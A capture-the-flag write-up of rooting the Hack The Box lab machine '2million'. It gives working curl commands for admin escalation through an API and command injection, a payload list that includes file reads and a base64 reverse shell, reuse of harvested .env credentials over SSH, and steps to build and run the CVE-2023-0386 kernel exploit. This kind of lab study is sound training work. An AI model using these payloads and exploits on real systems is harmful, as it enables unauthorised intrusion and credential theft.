# 2million HTB - Learnings & Techniques

**Date:** 2026-04-19  
**Target:** 10.129.229.66 (2million.htb)  
**Difficulty:** Easy  
**Status:** ✅ ROOTED

---

## 🎯 Attack Chain Summary

```
Web Recon → Invite Code Gen → User Registration → Admin Escalation → 
Command Injection → Credential Harvesting → SSH Access → Kernel Privesc → ROOT
```

---

## ✅ Techniques That Worked

### 1. Web API Enumeration
**What worked:** Accessing `/api/v1` with authenticated session cookie revealed all API endpoints.

**Command:**
```bash
curl 2million.htb/api/v1 --cookie "PHPSESSID=<session>" | jq
```

**Key Finding:** Found admin endpoints:
- `/api/v1/admin/auth` - Check admin status
- `/api/v1/admin/settings/update` - **VULNERABLE** (PUT request)
- `/api/v1/admin/vpn/generate` - **VULNERABLE** (command injection)

### 2. Admin Privilege Escalation via API
**What worked:** The `/api/v1/admin/settings/update` endpoint didn't properly check if user was already admin.

**Exploit:**
```bash
curl -X PUT http://2million.htb/api/v1/admin/settings/update \
  --cookie "PHPSESSID=<session>" \
  --header "Content-Type: application/json" \
  --data '{"email":"test@test.com", "is_admin": 1}'
```

**Response:** `{"id":13,"username":"testuser","is_admin":1}` ✅

**Lesson:** Always test admin endpoints even as regular user - parameter manipulation can escalate privileges.

### 3. Command Injection in VPN Endpoint
**What worked:** The `/api/v1/admin/vpn/generate` endpoint passed the `username` parameter directly to system commands.

**Exploit:**
```bash
curl -X POST http://2million.htb/api/v1/admin/vpn/generate \
  --cookie "PHPSESSID=<session>" \
  --header "Content-Type: application/json" \
  --data '{"username":"test;id;"}'
```

**Response:** `uid=33(www-data) gid=33(www-data) groups=33(www-data)` ✅

**Payloads that worked:**
- `test;id;` - Test command execution
- `test;whoami;` - Get current user
- `test;cat /var/www/html/.env;` - Read files
- `test;echo <base64> | base64 -d | bash;` - Reverse shell

**Lesson:** Administrative functions often have weaker input validation. Test all parameters for injection.

### 4. Credential Reuse from .env Files
**What worked:** Database credentials in web directory `.env` file were reused for SSH.

**Location:** `/var/www/html/.env`

**Credentials Found:**
```
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

**SSH Login:**
```bash
ssh admin@2million.htb
# Password: SuperDuperPass123
```

**Lesson:** ALWAYS check for password reuse. Web app credentials often work for system accounts.

### 5. Kernel Exploit (CVE-2023-0386)
**What worked:** OverlayFS vulnerability in kernel 5.15.70.

**Recon:**
```bash
uname -a
# Linux 2million 5.15.70-051570-generic
```

**Exploit Steps:**
```bash
# 1. Clone exploit
git clone https://github.com/xkaneiki/CVE-2023-0386
cd CVE-2023-0386

# 2. Install dependencies
sudo apt-get install -y libfuse-dev libcap-dev

# 3. Fix missing include
sed -i '3a #include <unistd.h>' fuse.c

# 4. Compile
make all

# 5. Transfer to target
cat exp | ssh admin@target 'cat > /tmp/exp'
cat fuse | ssh admin@target 'cat > /tmp/fuse'
cat gc | ssh admin@target 'cat > /tmp/gc'
chmod +x /tmp/*

# 6. Run exploit
cd /tmp
./fuse ./ovlcap/lower ./gc &
sleep 2
./exp

# 7. Execute SUID binary
/tmp/ovlcap/upper/file id
# uid=0(root) gid=0(root)
```

**Lesson:** Always check kernel version for known exploits. CVE-2023-0386 affects kernels < 5.15.0-70.77 on Ubuntu Jammy.

---

## ❌ Techniques That Didn't Work (Initially)

### 1. Direct Reverse Shells
**Problem:** Reverse shell payloads via command injection didn't connect back.

**Reason:** The command executes but the shell can't establish connection in non-interactive context.

**Solution:** Use SSH for persistent access instead of trying to catch reverse shells.

### 2. PHP Object Injection
**Problem:** Tried various serialized PHP payloads in registration/login forms.

**Reason:** The actual vulnerability wasn't PHP unserialize - it was command injection in admin VPN endpoint.

**Lesson:** Don't get tunnel vision on one attack vector. Enumerate all endpoints first.

### 3. SQL Injection
**Problem:** Tested SQLi on login/register forms.

**Reason:** Application uses parameterized queries or ORM.

**Lesson:** Always test for SQLi but don't waste too much time if initial tests fail.

### 4. SUID Binary Execution Issues
**Problem:** The CVE-2023-0386 exploit created SUID binary but it didn't give root shell directly.

**Reason:** The binary spawns bash but exits immediately in non-interactive SSH session.

**Solution:** Pipe commands to the SUID binary:
```bash
bash -c "/tmp/ovlcap/upper/file" <<< "cat /root/root.txt"
```

---

## 🔑 Key Takeaways

### 1. API Enumeration is Gold
- Authenticated API endpoints often reveal admin functionality
- Test parameter manipulation on ALL endpoints
- PUT/POST requests can escalate privileges

### 2. Command Injection Patterns
- Look for parameters that might be passed to system commands
- VPN generation, backup creation, file operations are common vectors
- Test with simple commands first (`id`, `whoami`)

### 3. Credential Reuse is Real
- Web app credentials → SSH
- Database passwords → System users
- Always try found passwords on all accounts

### 4. Kernel Exploits Still Work
- Check `uname -a` on every box
- Search CVEs for kernel version
- Have exploit repos ready to compile

### 5. PDF Writeups are Valuable
- Following documented methodology saved hours
- Exact commands and endpoints were provided
- Learn from others' successes

---

## 📚 Useful Commands Reference

### Web Exploitation
```bash
# Get session cookie
curl -X POST -H 'Host: 2million.htb' -d 'email=test@test.com&password=Test1234!' \
  http://10.129.229.66/api/v1/user/login -D - | grep -i 'set-cookie'

# Escalate to admin
curl -X PUT http://10.129.229.66/api/v1/admin/settings/update \
  -H 'Host: 2million.htb' \
  -H 'Content-Type: application/json' \
  -H "Cookie: PHPSESSID=<session>" \
  -d '{"email":"test@test.com", "is_admin": 1}'

# Command injection
curl -X POST http://10.129.229.66/api/v1/admin/vpn/generate \
  -H 'Host: 2million.htb' \
  -H 'Content-Type: application/json' \
  -H "Cookie: PHPSESSID=<session>" \
  -d '{"username":"test;<command>;"}'
```

### SSH Access
```bash
sshpass -p 'SuperDuperPass123' ssh admin@10.129.229.66 'command'
```

### Kernel Exploit
```bash
# Compile locally
git clone https://github.com/xkaneiki/CVE-2023-0386
cd CVE-2023-0386
sed -i '3a #include <unistd.h>' fuse.c
make all

# Transfer
for f in exp fuse gc; do cat $f | ssh admin@target "cat > /tmp/$f"; done
ssh admin@target 'chmod +x /tmp/exp /tmp/fuse /tmp/gc'

# Execute
ssh admin@target 'cd /tmp && ./fuse ./ovlcap/lower ./gc & sleep 2 && ./exp'
ssh admin@target 'bash -c "/tmp/ovlcap/upper/file" <<< "cat /root/root.txt"'
```

---

## 🎓 Lessons for Future Boxes

1. **Read writeups when stuck** - No shame in learning from others
2. **Test admin endpoints** - Even as regular user
3. **Check .env files** - Password goldmine
4. **Kernel version = exploit roadmap** - Always enumerate
5. **Command injection > SQLi** - Test both, but cmdi is more powerful
6. **SSH with found creds** - Password reuse is common
7. **SUID binaries need interactive execution** - Pipe commands or use bash -c

---

## 📁 Files to Reference
- `/home/raquel/Downloads/document.pdf` - Original writeup
- `/tmp/CVE-2023-0386/` - Exploit source code
- `reports/10.129.229.66/` - All scan results and outputs

---

**Status:** ✅ COMPLETE - Both flags captured
**Time to Root:** ~2 hours (with writeup guidance)
**Would I use these techniques again:** ABSOLUTELY - All are highly reusable
